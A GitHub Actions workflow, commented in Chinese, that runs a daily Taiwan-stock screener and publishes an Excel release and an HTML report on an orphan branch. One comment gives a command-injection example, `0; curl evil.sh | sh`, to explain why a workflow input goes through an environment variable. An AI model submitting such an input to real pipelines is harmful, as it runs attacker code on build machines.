name: 每日篩選

# 台股 13:30 收盤，Yahoo 的日線大約 14:30 之後才穩定。台北 15:10 = UTC 07:10。
#
# 只在週一到週五跑。週末沒有新的收盤價，跑出來的是禮拜五那一份的複製品，而
# 每天 commit 一份一模一樣的 index.html 只會讓 git 歷史變成雜訊。
on:
  schedule:
    - cron: "10 7 * * 1-5"
  workflow_dispatch:
    inputs:
      limit:
        description: "只掃前 N 檔（留空 = 全市場）。用來快速驗證整條路走不走得通。"
        required: false
        default: ""

# 同一時間只跑一個。手動觸發撞上排程的話，後來的那個等前一個做完——兩個一起跑
# 會有兩份 index.html 搶著 commit，其中一個必然失敗。
concurrency:
  group: daily
  cancel-in-progress: false

permissions:
  contents: write

jobs:
  screen:
    runs-on: ubuntu-latest
    # 全市場約 1,900 檔，八條連線大約 20～35 分鐘。90 分鐘的上限是留給
    # Yahoo 偶爾變慢的那幾天，而不是讓一個卡住的 job 燒掉六小時。
    timeout-minutes: 90

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
          cache: pip

      - run: pip install -r requirements.txt

      # matplotlib 畫 Excel 那些 K 線圖要中文字型。沒有它不會報錯，只會把每一個
      # 中文字畫成一個空心方框——而那要等到有人打開 Excel 才會發現。
      - name: 安裝中文字型
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq fonts-noto-cjk
          python -c "import matplotlib.font_manager as fm; fm._load_fontmanager(try_read_cache=False)"

      # exit 2 ＝「跑完了，但只掃到母體的一小部分」。那不是崩潰，報告照樣產得
      # 出來；它的意思是「這一份不可信，不要拿去覆蓋昨天那份」。所以這一步容忍
      # 2，由下面的發布步驟看 steps.screen.outputs.healthy 決定推不推。
      #
      # 輸入走 env 不直接內插進 shell：`${{ }}` 是在 shell 之前就展開的，
      # 一個 `0; curl evil.sh | sh` 會直接在這台 runner 上執行。
      - name: 全市場篩選
        id: screen
        env:
          LIMIT: ${{ github.event.inputs.limit || 0 }}
        run: |
          set +e
          python -m tw_trend_filter \
            --output-dir output \
            --index index.html \
            --link-base "https://metallicatw.github.io/tw-six-metrics/stock" \
            --limit "$LIMIT"
          code=$?
          set -e
          if [ "$code" -eq 2 ]; then
            echo "::warning::母體覆蓋率不足，這一趟不發布報告（Excel 仍然照常留存）"
            exit 0
          fi
          exit "$code"

      # Excel 發成一個 release，每個交易日一個。
      #
      # 走過的兩條死路，寫在這裡免得有人再走一次：
      #
      # * **artifact**：30 天後下載不到，而且要登入 GitHub 才拿得到。
      # * **Google Drive**：服務帳號沒有自己的儲存空間，它在「我的雲端硬碟」
      #   底下建的檔案會算在自己的（零）配額上，回 403 storageQuotaExceeded。
      #   官方解法是「共用雲端硬碟」——Google Workspace 的功能，個人 Gmail
      #   開不出來。剩下 OAuth 委派，但那要一顆會被撤銷的 refresh token，
      #   而排程沒有瀏覽器可以重新授權。
      #
      # Releases 三件事都給：不過期、不必登入就下載、歷史全留。而且不用任何
      # 憑證——GITHUB_TOKEN 是 runner 自己就有的。
      #
      # 同一天重跑就覆蓋（`--clobber`），不是在同一個 release 底下堆出第二個
      # 一模一樣的檔名。
      - name: 發布 Excel 到 Releases
        if: hashFiles('output/*.xlsx') != ''
        env:
          GH_TOKEN: ${{ github.token }}
          DAY: ${{ steps.screen.outputs.date }}
          COUNT: ${{ steps.screen.outputs.count }}
        run: |
          set -euo pipefail
          tag="excel-${DAY:-$(date -u +%F)}"
          file=$(ls output/*.xlsx | head -1)
          if gh release view "$tag" >/dev/null 2>&1; then
            echo "release $tag 已經在，覆蓋附件"
            gh release upload "$tag" "$file" --clobber
          else
            gh release create "$tag" "$file" \
              --title "Excel 報表 ${DAY}" \
              --notes "台股順勢交易篩選 ${DAY}：${COUNT} 檔通過。

          這一份是當日的完整 Excel 報表（篩選總覽、指標明細、個股 K 線圖）。
          每個交易日一份，不會過期。"
          fi
          echo "  $(basename "$file") → $tag"

      # artifact 留著當退路，不是重複。
      #
      # 發 release 那一步會因為權限、tag 撞名、GitHub 當機而失敗，而它失敗的
      # 那一天 Excel 就只剩這裡有。artifact 不花錢也不進 git，留著的成本是零。
      # 報告上那顆連結指的是 Releases 頁。
      - name: 上傳 Excel 報表（退路）
        if: always() && hashFiles('output/*.xlsx') != ''
        uses: actions/upload-artifact@v4
        with:
          name: trend-filter-excel-${{ steps.screen.outputs.date || github.run_id }}
          path: output/*.xlsx
          retention-days: 30
          compression-level: 9

      # 報告推到 `report` 分支，**不進 main**。
      #
      # 原本是 commit 回 main，而那讓兩種完全不同的東西擠在同一條線上：程式碼
      # 的修改（人寫的，要審、要合併）和每天一份 2.8 MB 的產出（機器寫的，
      # 隔天就被下一份取代）。結果是每次改程式都會跟排程撞車，衝突的檔案永遠
      # 是同一個 index.html，而那個衝突沒有「哪一邊對」——兩邊都是產生出來的。
      # 三次之後就該承認這不是運氣問題。
      #
      # `report` 是一條**只有一個 commit** 的孤兒分支，每天整條重寫：
      #
      #   * main 上再也沒有 index.html，所以改程式不會再撞到排程。
      #   * 歷史不累積。原本每天 2.8 MB 進 git，一年約 150～200 MB；現在永遠
      #     只有最新那一份。（README 裡那段「真的長太大時該怎麼辦」就是這個。）
      #   * 下游拿法幾乎不變：`git clone --depth 1 --branch report`。
      #
      # 用 orphan + force push 而不是一般 commit：一般 commit 的話歷史照樣會長，
      # 只是長在別的分支上。
      #
      # `healthy != 'no'` 是這條分支唯一的安全帶：force push 到一條只有一個
      # commit 的孤兒分支，覆蓋掉就沒有第二份。母體只掃到一小部分的那天，
      # 寧可讓網站繼續顯示昨天那份好的。
      - name: 發布報告到 report 分支
        if: steps.screen.outputs.healthy != 'no'
        run: |
          test -s index.html || { echo "::error::沒有產生 index.html"; exit 1; }
          cp index.html /tmp/report.html
          git config user.name  "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git checkout --orphan report
          git rm -rq --cached .
          cp /tmp/report.html index.html
          git add -f index.html
          git commit -q -m "報告：${{ steps.screen.outputs.date }}（${{ steps.screen.outputs.count }} 檔通過）"
          # force：這條分支本來就是「只有最新那一份」，不是歷史。
          git push -f origin report

      - name: 摘要
        if: always()
        run: |
          {
            echo "### 台股順勢交易篩選 ${{ steps.screen.outputs.date }}"
            echo ""
            echo "* 掃描：${{ steps.screen.outputs.scanned }} 檔"
            echo "* 通過：**${{ steps.screen.outputs.count }}** 檔"
            echo "* Excel 報表在本頁下方的 Artifacts 區（保留 30 天）"
          } >> "$GITHUB_STEP_SUMMARY"
